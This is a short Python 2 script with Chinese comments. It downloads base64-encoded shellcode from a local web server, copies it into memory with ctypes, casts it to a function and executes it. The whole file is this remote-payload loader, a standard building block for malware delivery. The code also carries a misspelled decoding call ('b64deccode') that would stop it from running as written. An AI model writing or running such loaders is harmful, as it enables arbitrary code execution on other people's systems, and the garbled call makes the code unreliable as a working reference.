import urllib2
import ctypes
import base64

#从我们的Web服务器上下载shellcode
url="http://localhost:8000/shellcode.bin"
response=urllib2.urlopen(url)

#base64解码shellcode
shellcode=base64.b64deccode(response.read())

#申请内存空间
shellcode_buffer=ctypes.create_string_buffer(shellcode,len(shellcode))

#创建shellcode的函数执政
shellcode_func=ctypes.cast(shellcode_buffer,ctypes.CFUNCTYPE(ctypes.c_void_p))

#执行shellcode
shellcode_func()
